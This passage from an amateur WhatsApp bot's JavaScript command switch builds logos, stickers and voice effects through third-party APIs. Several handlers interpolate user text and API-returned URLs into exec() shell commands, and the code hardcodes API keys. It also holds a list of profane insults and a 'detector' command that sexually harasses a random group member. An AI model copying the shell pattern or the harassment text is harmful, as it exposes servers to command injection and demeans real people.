					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'wlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210223_052617.jpg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=6%25&text.0.position.y=55%25&text.0.size=30&text.0.color=ff0000&text.0.font.family=Signika%20Negative&text.0.font.weight=700&text.0.background.opacity=11&text.0.outline.blur=98&text.0.outline.opacity=0`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'bfig':
					if (args.length < 1) return reply(' envie um texto!✨')
					reply(mess.wait)	
					teks = body.slice(10)
					ranp = getRandom('.png')
					rano = getRandom('.webp')		
					anu = await fetchJson(`https://api.xteam.xyz/ttp?file&text=${teks}`, {method: 'get'})
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						client.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
                                        await limitAdd(sender)
					break
			    case 'glogo':
			    dark = `${body.slice(7)}`
			    da = dark.split("/")[0];
			    rk = dark.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/0d1dc54c127cf3f8a53afe515a1efb8f.jpg?text.0.text=${rk}&text.0.position.gravity=center&text.0.position.y=45%25&text.0.size=30&text.0.color=ffffff&text.0.font.weight=700&text.0.font.style=italic&text.0.background.opacity=79&text.0.outline.opacity=37&text.1.text=${da}&text.1.position.gravity=north&text.1.size=30&text.1.color=ff0000&text.1.font.weight=600&text.1.font.style=italic`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break  
			    case 'dnobg2':
			    nobg = `${body.slice(7)}`
			    no = nobg.split("/")[0];
			    bg = nobg.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_052102.png?text.0.text=${no}&text.0.position.gravity=north&text.0.color=ff0000&text.0.opacity=99&text.0.font.family=Droid%20Serif&text.0.font.weight=600&text.0.background.opacity=74&text.0.outline.opacity=0&text.1.text=${bg}&text.1.position.gravity=center&text.1.position.y=25%25&text.1.color=4f00ff&text.1.opacity=83&text.1.font.family=Marck%20Script&text.1.outline.blur=82`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
					break
		case 'hub':
			    nobg = `${body.slice(7)}`
			    no = nobg.split("/")[0];
			    bg = nobg.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://api.zeks.xyz/api/phub?apikey=apivinz&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=${no}&msg=${bg}`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
					break
//textpro
				case 'dtp': 
					pngttp = './tmp/ttp.png'
					webpng = './tmp/ttp.webp'
					const ttptext = body.slice(5)
					fetch(`https://api.areltiyan.site/sticker_maker?text=${ttptext}`, { method: 'GET'})
					.then(async res => {
					const ttptxt = await res.json()
					base64Img.img(ttptxt.base64, 'tmp', 'ttp', function(err, filepath) {
					if (err) return console.log(err);
					exec(`ffmpeg -i ${pngttp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${webpng}`, (err) => {
					buffer = fs.readFileSync(webpng)
					client.sendMessage(from, buffer, sticker)
					fs.unlinkSync(webpng)
					fs.unlinkSync(pngttp)
					})
					})
					});
				break
                case 'slap2':
                    kapankah = body.slice(1)
					const slap =['anjing','babi lu','anak anjing','udah tolol nub Lagi','muka lo kek monyet','udah jomblo sendirian lagi dirumah tolol','so so an mau punya pacar muka aja kek monyet lepass dari kandang','ganteng doang di toxic aja dibilang baperan','pantek kau','bangsat kau','ku entod kalian nangis kau','memek lu semua','lihat anak anjing lagi baca','ngentot lu ya?','ganteng doang jemput cewe dipanggang','kamu cantik beb bullshit anjing cowo buaya','anak dajjal','puki lu','anjing ngajak gelud?','sama hantu takut cupu ngentod','cupu cupu aja gausah bacot','kontol lu semua','bocah lu semua kontol','3 Hari Lagi','Ngontol Amat']
					const ple = slap[Math.floor(Math.random() * slap.length)]
					pod = await getBuffer(`https://media.giphy.com/media/S8507sBJm1598XnsgD/source.gif`)
					client.sendMessage(from, pod, image, { quoted: mek, caption: '*Toxic*\n\n'+ ple })
					await limitAdd(sender)
					break
               case 'pbitly':		
				if (!isPremium) return reply('Voce não é Premium, malz.')
				if (args.length < 1) return reply(`Onde está o link? Por favor, coloque o link com *https://...*`)
				if (!isUrl(args[0])) return reply('cade o url mano?')
				reply("Espere...")
				const resLink = await bitttly.shorten(`${args[0]}`)
				reply(`*${resLink.link}*`)
				break

//fotomaker

	case 'facebookpage':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break
	case 'costumwp':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break
	case 'pantaimalam':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break
	case 'pencil':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break
	case 'bakar':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break
	case 'crossgun':

	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply('pera um poko')
	  owgi = await client.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/crossgun/?urlgbr=${anu.display_url}`)
	 client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Não adicionou nada ao comando')
	}
	break					
			    case 'emoji':
			    teks = `${body.slice(7)}`
				anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/emoji2png?emoji=${teks}&type=aple`, {method: 'get'})
				jes = await getBuffer(anu)
				client.sendMessage(from, jes, image,{quoted : mek, caption : 'prontinho'})
				break
				case 'pornub':
					var gh = body.slice(9)
					var porn = gh.split("&")[0];
					var hub = gh.split("&")[1];
					if (args.length < 1) return reply(`「❗」Contoh : ${prefix}pornhub Ramlan & Hub`)
					reply('pera um pokin uai')
					alan = await getBuffer(`https://vinz.zeks.xyz/api/pornhub?text1=${porn}&text2=${hub}`)
					client.sendMessage(from, alan, image, {quoted: mek})
					await limitAdd(sender)
				break
				case 'litext':
				
					if (args.length < 1) return reply(ind.wrongf())
					ligh = body.slice(11)
					if (ligh.length > 10) return reply('Teksnya kepanjangan, maksimal 9 karakter')
					reply('pera um pokin uai')
					lawak = await getBuffer(`https://api.zeks.xyz/api/tlight?text=${ligh}&apikey=apivinz`)
			    	client.sendMessage(from, lawak, image, {quoted: mek})
			   	 await limitAdd(sender)
		  	  break
				case 'chuva':
				
					if (args.length < 1) return reply(ind.wrongf())
					ligh = body.slice(11)
					if (ligh.length > 10) return reply('O texto é longo, até 9 caracteres')
					reply('pera um pokin uai')
					lawak = await getBuffer(`https://api.zeks.xyz/api/dropwater?apikey=apivinz&text=${teks}`)
			    	client.sendMessage(from, lawak, image, {quoted: mek})
			   	 await limitAdd(sender)
		  	  break	
		  	  	case 'neon':
				
					if (args.length < 1) return reply(ind.wrongf())
					ligh = body.slice(11)
					if (ligh.length > 16) return reply('O texto é longo, até 15 caracteres')
					reply('pera um pokin uai')
					lawak = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${teks}`)
			    	client.sendMessage(from, lawak, image, {quoted: mek})
			   	 await limitAdd(sender)
		  	  break		  	  	  	  
                case 'gtext':

					var gh = body.slice(12)
					var gli = gh.split("/")[0];
					var tch = gh.split("/")[1];
					if (args.length < 1) return reply(`「❗」Exemplo : ${prefix}gtext olaf/lindo`)
					reply('pera um pokin uai')
					buffer = await getBuffer(`https://api.zeks.xyz/api/gtext?text1=${gli}&text2=${tch}&apikey=apivinz`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
				break
				case 'nulis':

					if (args.length < 1) return reply(`Teksnya mana kak? Contoh : ${prefix}nulis Ramlan baik hati`)
					nul = body.slice(7)
					reply('「❗」ESPERE BRO')
					tak = await getBuffer(`https://api.zeks.xyz/api/nulis?text=${nul}&apikey=apivinz`)
					client.sendMessage(from, tak, image, {quoted: mek, caption: 'Pronto 🤙'})
					await limitAdd(sender)				
				break			
				case 'tahta':

					if (args.length < 1) return reply(`「❗」Exemplo : ${prefix}tahta texto`)
					har = body.slice(12)
					reply('「❗」Aguarde')
					buffer = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${har}&apikey=apivinz`)
					client.sendMessage(from, buffer, image, {quoted: mek})
					await limitAdd(sender)
				break
				case 'mtext':
					nobg = `${body.slice(7)}`
					no = nobg.split("/")[0];
					bg = nobg.split("/")[1];
					reply('Estou fazendo, se der erro tente novamente ✓')
					buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome2/marvelstudio?apikey=303317918cbd497b094a7ad6&text1=${no}&text2=${bg}`, { method: 'get' })
					client.sendMessage(from, buffer, image, { quoted: mek, caption: 'PRONTINHO ✓' })
					break
				case 'batle3':
	      			if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *.Daftarvip* para adquirir o acesso Premium!' ,text, { quoted: mek })
					gh = `${body.slice(7)}`
					reply('espere')
					gbl1 = gh.split("|")[0];
					gbl2 = gh.split("|")[1];
					if (args.length < 1) return reply('Onde está o texto?')
					data = await getBuffer(`https://ferdiz-api.herokuapp.com/api/battlefield?text=${gbl1}&text2=${gbl2}`, { method: 'get' })
					buffer = await getBuffer(data.result)
					client.sendMessage(from, buffer, image, { quoted: mek })
					await limitAdd(sender)
					break
			    case 'steel':
			    dark = `${body.slice(7)}`
			    da = dark.split("/")[0];
			    rk = dark.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome2/steel3d?apikey=303317918cbd497b094a7ad6&text1=${da}&text2=${rk}`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
					break
				case 'grafit':
					nobg = `${body.slice(7)}`
					no = nobg.split("/")[0];
					bg = nobg.split("/")[1];
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome2/wallgravity?apikey=303317918cbd497b094a7ad6&text1=${no}&text2=${bg}`, { method: 'get' })
					client.sendMessage(from, buffer, image, { quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF' })
					await limitAdd(sender)
					break
				case 'wol':
					nobg = `${body.slice(7)}`
					no = nobg.split("/")[0];
					bg = nobg.split("/")[1];
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=${no}&text2=${bg}`, { method: 'get' })
					client.sendMessage(from, buffer, image, { quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF' })
					await limitAdd(sender)
					break
				case 'letext':
					nobg = `${body.slice(7)}`
					no = nobg.split("/")[0];
					bg = nobg.split("/")[1];
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/textprome2/lionlogo?apikey=303317918cbd497b094a7ad6&text1=${no}&text2=${bg}`, { method: 'get' })
					client.sendMessage(from, buffer, image, { quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF' })
					await limitAdd(sender)
					break
//voicemod	
                case 'normal':                 
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break

			case 'slow':

				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await client.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				client.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
				fs.unlinkSync(ran)
				})
				break

				case 'tupai':

					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'gemok':

					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'bass':                 

					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				case 'diabolico':                 
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=3:width_type=o:width=50:g=80 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break

				case 'estourar':                 
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=200:width_type=o:width=200:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						client.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break	
case 'esquilo':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					buz = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=65100" ${buz}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('*Ocorreu um erro, tente novamente.*')
						bah = fs.readFileSync(buz)
						client.sendMessage(from, bah, audio, {mimetype: 'audio/mp4', ptt:true}, {quoted: mek})
						fs.unlinkSync(buz)
					    })
				       break
			    case 'frase':
			    nobg = `${body.slice(7)}`
			    no = nobg.split("/")[0];
			    bg = nobg.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://api.ritekit.com/v2/image/quote?text=${no}&author=${bg}&textFont=Lora&textColor=%23000000&textFontWeight=400&authorFont=Lato&authorColor=%23e5e5e5&authorFontWeight=400&highlightColor=transparent&backgroundColor1=%238686bd&backgroundColor2=%231ddad6&width=400&height=400&client_id=52ad7438afd2baa8779f9266a8a997cd92771f1eb625`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break
			    			case 'gtav':
try {
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply('espere um pokin uai')
  owgi = await client.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hedhe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
 client.sendMessage(from, hedhe, image, {quoted:mek})
} else {
  reply('Marque a img pfv!')
}
await limitAdd(sender)
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply("Erro, tente novamente, (isso costuma ser normal) tente ate conseguir..")
}
break
			    			case 'lapis':
try {
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply('espere um pokin uai')
  owgi = await client.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hedhe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/pencil?apikey=e5ffa33d0e497d8d777fde52&img=${anu.display_url}`)
 client.sendMessage(from, hedhe, image, {quoted:mek})
} else {
  reply('Marque a img pfv!')
}
await limitAdd(sender)
} catch (e) {
console.log(`Error :`, color(e,'red'))
reply("Erro, tente novamente, (isso costuma ser normal) tente ate conseguir..")
}
break
			    case 'amor':
			    love = `${body.slice(7)}`
			    lo = love.split("/")[0];
			    ve = love.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://assets.imgix.net/examples/couple.jpg?txt64=VEUgQU1PIOKdpO-4jw&txt-font=bold&txt-align=middle%20center&txt-size=${lo}&blur=${ve}&txt-color=FF0000`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break  
			    case 'aguia2':
			    agia = `${body.slice(7)}`
			    ag = agia.split("/")[0];
			    ia = agia.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_024526.jpg?text.0.text=${ia}&text.0.position.gravity=center&text.0.position.y=45%25&text.0.size=24&text.0.color=ffffff&text.0.font.weight=700&text.0.font.style=italic&text.0.background.opacity=79&text.0.outline.opacity=37&text.1.text=${ag}&text.1.position.gravity=north&text.1.size=24&text.1.color=0040f2&text.1.font.family=Noticia%20Text&text.1.font.style=italic`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break  
                case 'black':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/images%20-%202021-02-22T225108.251.jpeg?text.0.text=${teks}&text.0.color=ffffff&text.0.font.family=Tangerine&text.0.font.weight=800&text.0.background.opacity=18&text.0.outline.blur=82`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
      case 'detector':
			reply('Calculando foto dos participantes do grupo...')
            await sleep(3000)
            const eu = await client.getGroupMembers(groupId)
            const gostosa = eu[Math.floor(Math.random() * eu.length)]
            await client.sendTextWithMentions(from, `*ＤＥＴＥＣＴＯＲ   ＤＥ  ＧＯＳＴＯＳＡＳ👩‍⚕️*\n\n*pi pi pi pi*  \n*pipipipi🚨🚨🚨pipipipi🚨🚨🚨pipipipi🚨🚨🚨pipi*\n\n@${gostosa.id.replace(/@c.us/g, '')} *PARADA(O) AÍ🖐*\n\n*VOCÊ ACABA DE RECEBER DUAS MULTAS*\n\n*1 por não dar bom dia,boa tarde,boa noite e outra por ser muito*\n\n*gostosa(o)*\n\n*valor da multa:*\n*FOTO DA TETINHA NO PV kkkkk*`)
            await sleep(2000)
            break
                case 'attp2':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${teks}`)
					client.sendMessage(from, buffer, video, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'clogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 9) return reply('O texto é longo, até 9 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_230542.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.y=2%25&text.0.size=23&text.0.color=000000&text.0.opacity=58&text.0.font.weight=600&text.0.font.style=italic&text.0.outline.opacity=24`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break	
                case 'letxt':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 9) return reply('O texto é longo, até 9 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/images%20-%202021-02-23T231504.507.jpeg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=8%25&text.0.position.y=30%25&text.0.size=30&text.0.color=0800ff&text.0.font.weight=600&text.1.text=${teks}&text.1.position.gravity=northwest&text.1.position.x=7%25&text.1.position.y=30%25&text.1.size=30&text.1.color=ffffff&text.1.font.weight=600&text.1.background.opacity=96`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break		
                case 'text3d':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 9) return reply('O texto é longo, até 9 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210223_235608.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.x=2%25&text.0.size=30&text.0.color=ff0000&text.0.font.weight=600&text.1.text=${teks}&text.1.position.gravity=center&text.1.position.x=1%25&text.1.size=30&text.1.color=ffffff&text.1.font.weight=600&text.1.outline.blur=57`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break			
                case 'milogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/images%20-%202021-02-22T014719.920.jpeg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=50%25&text.0.size=15&text.0.color=000000&text.0.font.family=Ek%20Mukta&text.0.font.weight=600&text.0.font.style=italic&text.0.background.opacity=29`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
    case 'wanted':
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(mess.wait)
	  owgi = await dp.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/wanted/?urlgbr=${anu.display_url}&text1=DICARI&text2=${tels}`)
	  client.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
                case 'aguia':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 20) return reply('O texto é longo, até 20 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_024526.jpg?text.0.text=${teks}&text.0.position.gravity=center&text.0.position.y=30%25&text.0.size=25&text.0.color=ffffff&text.0.font.family=Philosopher&text.0.font.style=italic&text.0.background.color=ffffff`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'randlogo':
